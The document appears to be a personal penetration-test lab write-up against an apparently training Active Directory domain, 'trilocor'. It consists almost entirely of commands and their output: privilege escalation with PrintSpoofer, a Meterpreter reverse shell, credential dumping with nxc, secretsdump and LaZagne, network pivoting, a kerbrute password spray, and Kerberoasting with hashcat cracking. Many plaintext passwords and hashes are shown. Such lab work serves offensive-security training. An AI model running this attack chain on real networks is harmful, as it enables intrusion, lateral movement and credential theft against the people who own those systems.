SMB         172.16.139.35   445    SRV01            trilocor\SRV01$:plain_password_hex:07d78a0f8b73d65cc5f9d8d7ee82311457b293a1c28cbc1f5d4315d0edf036f249fa91a2c6b9df1301e027430aa87775b668c7de33af977f6050e3c373a695eede9088e7fb2db0038acfa12d54d604c16076f06ad753ac2d08189c5ba9e890c98f59a04bb327288e462c6a390f60f427444dc752b86dccc1ccbf7477fef71539ae1c1dd126f339fed5313d107154930961d457e479d6acd8c402c4f15738effb0e23baa54ee4d8daac299133a51943c5a163f7f310725796b06cd229f7d43ad2ccdc27610542dd82adeaa0a08edda80f9c7c137a2055570f48ab3bd3349f14cabf0d70cf81eb68a96a96bfbaa2c7f408                                                                                                                                                                                         
SMB         172.16.139.35   445    SRV01            trilocor\SRV01$:aad3b435b51404eeaad3b435b51404ee:ce9bcba494b86e3340b2e457d2a78aed:::
SMB         172.16.139.35   445    SRV01            dpapi_machinekey:0xb5e34da2d073f50239f822463c615dfcdc66e36a
dpapi_userkey:0x51f29c425b7dbea59fbee474e2a4f6566448d74a
SMB         172.16.139.35   445    SRV01            svc_liferay:RnD0mPAssw0rdSup3rS3crET123
SMB         172.16.139.35   445    SRV01            [+] Dumped 8 LSA secrets to /root/.nxc/logs/lsa/SRV01_172.16.139.35_2026-01-22_180823.secrets and /root/.nxc/logs/lsa/SRV01_172.16.139.35_2026-01-22_180823.cached
```

![[Pasted image 20260122201142.png]]


![[Pasted image 20260122192201.png]]

![[Pasted image 20260122194046.png]]


```powershell
*Evil-WinRM* PS C:\programdata> .\PrintSpoofer64.exe -i -c cmd
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.6893]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
*Evil-WinRM* PS C:\programdata> whoami
srv01\administrator
*Evil-WinRM* PS C:\programdata> .\PrintSpoofer64.exe -i -c "C:\Temp\revv.exe"
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

```


```powershell
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:7000 
[*] Sending stage (230982 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:7000 -> 127.0.0.1:51982) at 2026-01-22 17:36:31 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```powershell
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain    NTLM                        SHA1                        DPAPI
--------     ------    ----                        ----                        -----
SRV01$       trilocor  1e34b7930ee92d4fc46f9262ac  a3e6c017532c6dfa9bd312f324  a3e6c017532c6dfa9bd312f3243
                       d868ff                      3ff3d6c2826e80              ff3d6
SRV01$       trilocor  ce9bcba494b86e3340b2e457d2  51932eadd0140fb0ba463baa7e  51932eadd0140fb0ba463baa7e6
                       a78aed                      65df43ae006b4a              5df43
svc_liferay  SRV01     c4c84ac54ac6d31b6e8fce1d09  965935108804f2db64c93efa18  965935108804f2db64c93efa18a
                       7f4a98                      a7f629ff3ddf23              7f629


```

```powershell
*Evil-WinRM* PS C:\users\rhinkle\appdata\roaming\Sublime text 3\local> gci -force


    Directory: C:\users\rhinkle\appdata\roaming\Sublime text 3\local


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2022   3:55 AM           3581 Session.sublime_session


*Evil-WinRM* PS C:\users\rhinkle\appdata\roaming\Sublime text 3\local> type Session.sublime_session
{
        "folder_history":
        [
        ],
        "last_version": 3211,
        "last_window_id": 1,
        "log_indexing": false,
        "settings":
        {
        },
        "windows":
        [
                {
                        "auto_complete":
                        {
                                "selected_items":
                                [
                                ]
                        },
                        "buffers":
                        [
                                {
                                        "contents": "- Move all development activities to WKS01 VDI. Infra set up a shared login (Keep amongst the project team)\n\tHost: 172.16.139.175\n\tUsername: devuser_1\n\tPassword: Changemeplz123!\"\n\n- Move to 1Password once deployed company-wide\n- Set AxCrypt-2 default to AES-256",
                                        "settings":
                                        {
                                                "buffer_size": 261,
                                                "line_ending": "Windows",
                                                "name": "- Move all development activities to WKS01 VDI. In"
                                        }
                                }
                        ],
                        "build_system": "",
                        "build_system_choices":

```

```bash
                                        "contents": "- Move all development activities to WKS01 VDI. Infra set up a shared login (Keep amongst the project team)\n\tHost: 172.16.139.175\n\tUsername: devuser_1\n\tPassword: Changemeplz123!\"\n\n- Move to 1Password once deployed company-wide\n- Set AxCrypt-2 default to AES-256",
```

![[Pasted image 20260122203434.png]]

```bash
msf post(multi/manage/autoroute) > set session 1
session => 1
msf post(multi/manage/autoroute) > set subnet 172.16.139.0
subnet => 172.16.139.0
msf post(multi/manage/autoroute) > run
[*] Running module against SRV01 (127.0.0.1)
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.139.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf post(multi/manage/autoroute) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > run autoroute -p
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.139.0       255.255.255.0      Session 1

meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.139.175
[*] Forward TCP relay created: (local) :3300 -> (remote) 172.16.139.175:3389

```

![[Pasted image 20260123122155.png]]

![[Pasted image 20260123122314.png]]

![[Pasted image 20260123134529.png]]

```powershell
PS C:\ProgramData> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\ProgramData> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\ProgramData> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                                        DisplayVersion  InstallLocation
-----------                                                        --------------  ---------------
Google Chrome                                                      106.0.5249.119  C:\Program Files\Google\Chrome\Application
KeePass Password Safe 2.51.1                                       2.51.1          C:\Program Files\KeePass Password Safe 2\
Microsoft Edge                                                     133.0.3065.69   C:\Program Files (x86)\Microsoft\Edge\Application
Microsoft Edge WebView2 Runtime                                    133.0.3065.69   C:\Program Files (x86)\Microsoft\EdgeWebView\Application
Microsoft Update Health Tools                                      3.74.0.0
Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.36.32532 14.36.32532.0
Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.36.32532 14.36.32532.0
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532     14.36.32532
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532        14.36.32532
Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532     14.36.32532
Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532        14.36.32532
Mozilla Firefox 46.0 (x64 en-US)                                   46.0            C:\Program Files\Mozilla Firefox
Mozilla Maintenance Service                                        46.0
Notepad++ (64-bit x64)                                             8.4.2
Psi (remove only)
Remote Mouse version 3.008                                         3.008           C:\Program Files (x86)\Remote Mouse\
Update for x64-based Windows Systems (KB5001716)                   8.94.0.0
VMware Tools                                                       12.4.0.23259341 C:\Program Files\VMware\VMware Tools\
Windows PC Health Check                                            3.6.2204.08001


PS C:\ProgramData>
```

https://www.exploit-db.com/exploits/50047

![[Pasted image 20260123134353.png]]

![[Pasted image 20260123134645.png]]

```cmd
Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.
C:\Windows>whoami
nt authority\system                                                                                         
```

![[Pasted image 20260123134818.png]]

```cmd
PS C:\Users\Administrator\Desktop> type .\flag.txt
e6b69ce6f8c9d3c43dfbfb6757fa166b
```

![[Pasted image 20260123135222.png]]

![[Pasted image 20260123140023.png]]

```cmd
C:\Users\devuser_1\Documents>reg save HKLM\SAM samm.bak
The operation completed successfully.

C:\Users\devuser_1\Documents>reg save HKLM\SYSTEM system.bak
The operation completed successfully.

C:\Users\devuser_1\Documents>reg save HKLM\SECURITY security.bak
The operation completed successfully.
```


![[Pasted image 20260123140008.png]]

```bash
impacket-secretsdump -sam samm.bak -system system.bak -security security.bak LOCAL
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x320cdcd2b22f936d6d4e0dc8d1cb531f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd074f7de6ee693b5ec6ef24ee9adf9b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5f7e7660c0f67826faca5e0b5409d897:::
devuser_1:1002:aad3b435b51404eeaad3b435b51404ee:e043c4d598d69116c8eb4892a415b565:::
[*] Dumping cached domain logon information (domain/username:hash)
AD.TRILOCOR.LOCAL/bvincent:$DCC2$10240#bvincent#14edaa754c3ae41184f4306c98f6a553: (2022-10-28 09:40:06+00:00)
AD.TRILOCOR.LOCAL/Administrator:$DCC2$10240#Administrator#64e2f5f3632bcb0f233e371b9ea6aba3: (2025-02-18 18:59:49+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:9f3f8e74b1368f8b6e20b9775a9d1c3e76bb4de1d485f1c8c093533b7dc3fcb8ce029b685c9cc9da7d70d6c4e571ee654a2b459ff8260d2b804c33ac2a42da3adaf98be82a1a38b32a9fe3b4fe4e9e1c5d44e73462b2003469403b4cf8f10f5f8dcd8393972750897c4c6319bef0ff9bf1dfb0eb521442c18c64d1ff71ccd53fc695d4502cdec5b623fc463fa424e2ec85d92a8272d8f5eeeeb7392e5982410787440f0e5969b37eb13893685a4b31566a3504589087b59678c316bf46bacf86bde23a15176b06b7d9ca6e8c7d7af776703f86463a94c54b4a4624313030f93490b9fa8347ec4878705116a46a47af35
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:dd0cb8bccaa5126aba40296cb8ea03e7
[*] DefaultPassword 
(Unknown User):Changemeplz123!"
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x57eef7fc8a38320442692f0c779292ead2a74364
dpapi_userkey:0x2b8d079ed0c0d135fbc9393e7b6a708975d1077e
[*] NL$KM 
 0000   EE 04 48 24 48 05 EA 6E  30 E8 77 93 51 5D 3E 1A   ..H$H..n0.w.Q]>.
 0010   17 40 CD FE AD D9 1F 53  9E 66 E8 E2 27 A8 B1 6C   .@.....S.f..'..l
 0020   13 BD 13 CC 92 79 33 73  68 14 86 86 4D FD E6 D4   .....y3sh...M...
 0030   AC 8B 88 B8 57 DF F4 A1  AA 2D CD A6 2F 57 AD 0C   ....W....-../W..
NL$KM:ee0448244805ea6e30e87793515d3e1a1740cdfeadd91f539e66e8e227a8b16c13bd13cc92793373681486864dfde6d4ac8b88b857dff4a1aa2dcda62f57ad0c
[*] Cleaning up...
```

lazagne

```powershell
PS C:\Users\devuser_1\Documents> .\LaZagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 10028356-ffd4-4031-94a1-e4c6bdd81c6d
[+] System masterkey decrypted for 1ac61c2a-5eab-4c5a-b923-65c3895128ec
[+] System masterkey decrypted for 25deda9e-9b53-490d-b7b6-282af629c0a8
[+] System masterkey decrypted for ecaf7a09-fe0d-4c03-8779-57e403746e21

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd074f7de6ee693b5ec6ef24ee9adf9b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5f7e7660c0f67826faca5e0b5409d897:::
devuser_1:1002:aad3b435b51404eeaad3b435b51404ee:e043c4d598d69116c8eb4892a415b565:::

------------------- Lsa_secrets passwords -----------------

$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   9F 3F 8E 74 B1 36 8F 8B 6E 20 B9 77 5A 9D 1C 3E    .?.t.6..n .wZ..>
0020   76 BB 4D E1 D4 85 F1 C8 C0 93 53 3B 7D C3 FC B8    v.M.......S;}...
0030   CE 02 9B 68 5C 9C C9 DA 7D 70 D6 C4 E5 71 EE 65    ...h....}p...q.e
0040   4A 2B 45 9F F8 26 0D 2B 80 4C 33 AC 2A 42 DA 3A    J+E..&.+.L3.*B.:
0050   DA F9 8B E8 2A 1A 38 B3 2A 9F E3 B4 FE 4E 9E 1C    ....*.8.*....N..
0060   5D 44 E7 34 62 B2 00 34 69 40 3B 4C F8 F1 0F 5F    ]D.4b..4i@;L..._
0070   8D CD 83 93 97 27 50 89 7C 4C 63 19 BE F0 FF 9B    .....'P.|Lc.....
0080   F1 DF B0 EB 52 14 42 C1 8C 64 D1 FF 71 CC D5 3F    ....R.B..d..q..?
0090   C6 95 D4 50 2C DE C5 B6 23 FC 46 3F A4 24 E2 EC    ...P,...#.F?.$..
00A0   85 D9 2A 82 72 D8 F5 EE EE B7 39 2E 59 82 41 07    ..*.r.....9.Y.A.
00B0   87 44 0F 0E 59 69 B3 7E B1 38 93 68 5A 4B 31 56    .D..Yi.~.8.hZK1V
00C0   6A 35 04 58 90 87 B5 96 78 C3 16 BF 46 BA CF 86    j5.X....x...F...
00D0   BD E2 3A 15 17 6B 06 B7 D9 CA 6E 8C 7D 7A F7 76    ..:..k....n.}z.v
00E0   70 3F 86 46 3A 94 C5 4B 4A 46 24 31 30 30 F9 34    p?.F:..KJF$100.4
00F0   90 B9 FA 83 47 EC 48 78 70 51 16 A4 6A 47 AF 35    ....G.HxpQ..jG.5
0100   90 26 96 18 C6 07 DC 55 1E 53 BC AA AD E0 CE 9A    .&.....U.S......

DefaultPassword
0000   20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     ...............
0010   43 00 68 00 61 00 6E 00 67 00 65 00 6D 00 65 00    C.h.a.n.g.e.m.e.
0020   70 00 6C 00 7A 00 31 00 32 00 33 00 21 00 22 00    p.l.z.1.2.3.!.".
0030   C8 8E 5E 3A 7F 5C E5 45 6B 35 55 A2 66 2D 73 1A    ..^:...Ek5U.f-s.

DPAPI_SYSTEM
0000   01 00 00 00 57 EE F7 FC 8A 38 32 04 42 69 2F 0C    ....W....82.Bi/.
0010   77 92 92 EA D2 A7 43 64 2B 8D 07 9E D0 C0 D1 35    w.....Cd+......5
0020   FB C9 39 3E 7B 6A 70 89 75 D1 07 7E                ..9>{jp.u..~

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   EE 04 48 24 48 05 EA 6E 30 E8 77 93 51 5D 3E 1A    ..H$H..n0.w.Q]>.
0020   17 40 CD FE AD D9 1F 53 9E 66 E8 E2 27 A8 B1 6C    .@.....S.f..'..l
0030   13 BD 13 CC 92 79 33 73 68 14 86 86 4D FD E6 D4    .....y3sh...M...
0040   AC 8B 88 B8 57 DF F4 A1 AA 2D CD A6 2F 57 AD 0C    ....W....-../W..
0050   D9 38 35 40 01 4F C1 BC E1 5F 0A 54 04 BD 94 9C    .85@.O..._.T....


------------------- Vault passwords -----------------

[-] Password not found !!!
URL: Domain:batch=TaskScheduler:Task:{0B53E6B2-BEF9-4AE0-933B-FB12D16C80C7}
Login: WKS01\Administrator


########## User: Administrator ##########

------------------- Psi-im passwords -----------------

[+] Password found !!!
Password: -PL<mko09ijn!
Login: bvincent@ad.trilocor.local


########## User: Administrator.trilocor ##########

------------------- Psi-im passwords -----------------

[+] Password found !!!
Password: -PL<mko09ijn!
Login: bvincent@ad.trilocor.local
```

![[Pasted image 20260123140727.png]]

```bash
PS C:\Users\devuser_1\Documents> .\SharpHound.exe -c all
2026-01-23T10:05:28.4521691-08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-01-23T10:05:29.3587095-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-01-23T10:05:29.8743432-08:00|INFORMATION|Initializing SharpHound at 10:05 AM on 1/23/2026
2026-01-23T10:05:30.1395909-08:00|INFORMATION|Resolved current domain to ad.trilocor.local
2026-01-23T10:05:30.5770088-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-01-23T10:05:30.8583310-08:00|INFORMATION|Beginning LDAP search for ad.trilocor.local
<SNIP>
2026-01-23T10:05:39.7022702-08:00|ERROR|Error during main ldap query:PagedQuery - Caught unrecoverable exception: The server does not support the control. The control is critical. (0)
2026-01-23T10:05:39.9675445-08:00|INFORMATION|Beginning LDAP search for ad.trilocor.local Configuration NC
2026-01-23T10:05:40.1081687-08:00|INFORMATION|Producer has finished, closing LDAP channel
2026-01-23T10:05:40.1081687-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-01-23T10:05:40.2331761-08:00|INFORMATION|[CommonLib LdapQuery]Execution time Average: 4.587411ms, StdDiv: 17.9070200210135ms
2026-01-23T10:05:48.6398208-08:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-01-23T10:05:48.6866694-08:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-01-23T10:05:48.8424796-08:00|INFORMATION|Status: 2435 objects finished (+2435 135.2778)/s -- Using 88 MB RAM
2026-01-23T10:05:48.8582247-08:00|INFORMATION|Enumeration finished in 00:00:18.0128602
2026-01-23T10:05:49.3274667-08:00|INFORMATION|Saving cache with stats: 24 ID to type mappings.
 0 name to SID mappings.
 3 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2026-01-23T10:05:49.3737931-08:00|INFORMATION|SharpHound Enumeration Completed at 10:05 AM on 1/23/2026! Happy Graphing!
```

![[Pasted image 20260123140822.png]]

passspray

```bash
*Evil-WinRM* PS C:\programdata> .\kerbrute.exe passwordspray -d ad.trilocor.local --dc 172.16.139.3 valid_users -- '-PL<mko09ijn!'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/23/26 - Ronnie Flathers @ropnop

2026/01/23 12:15:09 >  Using KDC(s):
2026/01/23 12:15:09 >   172.16.139.3:88
2026/01/23 12:15:10 >  [+] VALID LOGIN:  bvincent@ad.trilocor.local:-PL<mko09ijn!
2026/01/23 12:15:33 >  [!] devuser_1
@ad.trilocor.local:-PL<mko09ijn! - NETWORK ERROR - Can't talk to KDC. Aborting...
2026/01/23 12:15:33 >  Done! Tested 2925 logins (1 successes) in 24.477 seconds
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK

```

![[Pasted image 20260123142403.png]]


```bash
proxychains nxc smb 172.16.139.3 -u 'bvincent' -p='-PL<mko09ijn!'                    
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:135  ...  OK
SMB         172.16.139.3    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ad.trilocor.local) (signing:True) (SMBv1:None) (Null Auth:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
SMB         172.16.139.3    445    DC01             [+] ad.trilocor.local\bvincent:-PL<mko09ijn!
```


```bash
proxychains nxc smb 172.16.139.3 -u 'bvincent' -p='-PL<mko09ijn!' --shares                    
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:135  ...  OK
SMB         172.16.139.3    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ad.trilocor.local) (signing:True) (SMBv1:None) (Null Auth:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
SMB         172.16.139.3    445    DC01             [+] ad.trilocor.local\bvincent:-PL<mko09ijn! 
SMB         172.16.139.3    445    DC01             [*] Enumerated shares
SMB         172.16.139.3    445    DC01             Share           Permissions     Remark
SMB         172.16.139.3    445    DC01             -----           -----------     ------
SMB         172.16.139.3    445    DC01             ADMIN$                          Remote Admin
SMB         172.16.139.3    445    DC01             C$                              Default share
SMB         172.16.139.3    445    DC01             Department Shares READ            Share for department users
SMB         172.16.139.3    445    DC01             IPC$            READ            Remote IPC
SMB         172.16.139.3    445    DC01             LotusNotes      READ            LotusNotes
SMB         172.16.139.3    445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.139.3    445    DC01             Print_queue     READ,WRITE      Jobs task for Printer
SMB         172.16.139.3    445    DC01             Projects        READ            Projects
SMB         172.16.139.3    445    DC01             Public          READ            Public Share
SMB         172.16.139.3    445    DC01             Software                        Softwares
SMB         172.16.139.3    445    DC01             SYSVOL          READ            Logon server share 
SMB         172.16.139.3    445    DC01             Users           READ            Domain Users
SMB         172.16.139.3    445    DC01             ZZZ_archive                     Archives
```

![[Pasted image 20260123142841.png]]

bloodhoun-cliu

```bash
bloodhound-cli install
[+] Checking the status of Docker and the Compose plugin...
[+] Docker and the Compose plugin checks have passed
[+] Starting BloodHound environment installation
[*] A production YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: y
[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
y
[*] A development YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: [+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
 app-db Pulling 
 graph-db Pulling 
 bloodhound Pulling 
 bloodhound Pulled 
 graph-db Pulled 
 app-db Pulled 
 Container bloodhound-app-db-1  Running
 Container bloodhound-graph-db-1  Running
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: RMTZUsUcDioussItiVRy2jgbwDHiXgIK
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login

```


spns

```powershell
PS C:\Users\devuser_1\Documents> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
VERBOSE: get-domain
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.ad.trilocor.local/DC=ad,DC=trilocor,DC=local
VERBOSE: [Get-DomainUser] Searching for non-null service principal names
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=*))(servicePrincipalName=*))
```

![[Pasted image 20260123150304.png]]

```bash
hashcat -m 13100 hashessss /usr/share/wordlists/rockyou.txt   
hashcat (v7.1.2) starting

<SNIP>

$krb5tgs$23$*sqldev$ad.trilocor.local$MSSQLSvc/SQL-DEV01.ad.trilocor.local:1433*$b5321f0926a5e9359881b490316b2be3$618691c867841319699d9fe21b2a68ab0b67b0f98f0e8b5d3409b3aa6f0e192701f29a8e87681dec8906b80235468998779eeabad838980b1aa1a68e114d922958a2ae29141221de0b874cd80fca33867cd68651c4748794205c9700255bef6977fda70b93525ffb216398ab488dd0bd8b925bc1ebe55851999dadbaba3e1e03f11e79e3527012f1da857833bc6a1714e7f064ca99a0236ab7678841fc11979a79ed402d860a4ac38b89f9545ef6da6ebfb4e243f014ba2d43a00f0e1f280b29a99d1e1e52a486ff000d58b2294668f165ab221b40dd07d653f7795b65783cdb549978c378f57db662b87de51063a91eb2f301c8202f5ead30706a377f86b5719040677b816d39f58244bf933ff88dbabca5e687c4cb8d7a25edeb243700754c51b2d8d89658e33a7d30a5ec5b010a8ca269479b756a9c92c5c348a30a514e25a1733ec409b2ff160ff7a501a5cda77ded109d3960966d1e155c042960d86bbc42d037cefea0d59f1495688987185a3f09330a9c4b0e28520dbca6d492f5428722da0bd0c416b014c110394367c3ff775256fc8661e2e6b19c7a273b83ab75003913897286852d7519a76b8fe3343a4b31921950ff78c7e2e23eca6f7db4a2b02c503b49fe4dd1e900c940cc9db75afbcc416473253074fecb7ff0fa7dfbf8143f97d53419a6006934bac190a63103761e5b36416b07a1d8d212c75bd8de499072cc90b95342e1717ac4f75b62eff295a64c0884d4c1a78d8a8e2a26821b969245571ca34248d7fdb5eb7d32b54662a97469d0af3c75bb8d2d74943d84b89c008be620d73716ebf602e746b7d1220a1d80235d7c8e9bfdd5acec7b40d926ce01469a495db167238f3bf686e3fbc5cb40a0c9ed3089abb1f053e1f9de0e6e4d0269d03ed18d034eeb6b17c5c89bf6b88f3c3f4cc76faa3752ba15d57745462ed0de18e9083f5583ca2ec62a73f98c408f23ab142cc60f7f963de203cd047d6ca2d13ebaba34e1afc7e38a42a4612c4e7346c309235e23c5b0ba9171dd57210307af005fd2325d66dc9fc3e8ff764c60c603a394e6a6e5b3c79e46a107b9ba20726fd85ad1ebbe9fe093c377fbb22528162c7182c74ebaf93363d0acd15e3871aea06906aff5bfc94c0c66c83b6bb69af0434ce4967428492825037aa5088e5d5128b6b827526060fce51e0d05fdf6fec5c1a433315614cc871b26b0d75792c082f0bd4cff00f73bc45970e46e09f239560ecf3b59b228264914df2b59b000e39a26ab820efdd27eed5b515b6e2419cab6e39376f5e1467c66854458c21624957b3be73e32e15de5acc37a7a8b59c74001b170b1b5fbbd3400c80c740613e42497a7fae08115b1b2c2afb262dd94f2e86fe5739516a281e058fde54366d029f56953795b64ab80fcb4b9da5b99a1cf143f91d773c4e2441c2b878beb3956b4407f7f470f994d703758b808a32580a0239a8025e7d0e7ada685b84202674f8f8b00189e8c865e637fc975a9b312d58045969f215f72f204edaf3ce532c662cc023241cab145e59ead65ebe1923e988cf87559f3ab777c29e613c7faf42231f0106cd2319e13c2285a3a364518bf6fe9a9820ef6998b02c02e287c00e8df05f2c3fde72a3881924617ff857013f19fc697318b65:1212developer
